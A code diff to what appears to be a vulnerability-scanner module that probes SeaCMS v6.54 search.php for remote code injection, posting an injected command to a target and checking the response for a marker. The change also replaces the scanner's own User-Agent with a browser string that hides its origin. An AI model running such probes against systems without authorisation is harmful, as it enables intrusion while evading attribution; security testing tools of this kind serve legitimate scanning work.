@@ -13,9 +13,9 @@ import (
 
 // SeaCMSv654 search.php code injection.
 type SeaCMSv654 struct {
-	mconn   *muxConn
-	target  string
-	Existed string
+	mconn       *muxConn
+	target      string
+	Exploitable bool
 }
 
 // NewSeaCMSv654 .
@@ -31,13 +31,13 @@ func (s *SeaCMSv654) Set(v ...interface{}) {
 }
 
 // Report implements PoC interface.
-func (s *SeaCMSv654) Report() interface{} {
-	return s.Existed
+func (s *SeaCMSv654) Report() map[string]interface{} {
+	return nil
 }
 
 // Run implements PoC interface.
 func (s *SeaCMSv654) Run() {
-	logger.Green.Println("Checking SeaCMSv6.54 Vuls...")
+	logger.Green.Println("Checking SeaCMSv6.54 RCE...")
 	s.check()
 }
 
@@ -56,26 +56,28 @@ func (s *SeaCMSv654) check() {
 	client := &http.Client{
 		Timeout: 5 * time.Second,
 	}
-	req, _ := http.NewRequest("POST", "http://"+s.target+":8888/seacmsv6.54/upload/search.php"+cmd, strings.NewReader(payload.Encode()))
+	req, _ := http.NewRequest("POST",
+		"http://"+s.target+"/search.php"+cmd,
+		strings.NewReader(payload.Encode()))
 
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; AssassinGo/0.1)")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0")
 	resp, err := client.Do(req)
 	if err != nil {
 		logger.Red.Println(err)
-		s.Existed = "false"
+		s.Exploitable = false
 		return
 	}
 
 	body, _ := ioutil.ReadAll(resp.Body)
 	resp.Body.Close()
 	if strings.Contains(string(body), "AssassinGooo") {
-		s.Existed = "true"
+		s.Exploitable = true
 
 		logger.Blue.Println(s.target)
-		ret := map[string]string{
-			"host":    s.target,
-			"existed": s.Existed,
+		ret := map[string]interface{}{
+			"host":        s.target,
+			"exploitable": s.Exploitable,
 		}
 		s.mconn.send(ret)
 	}
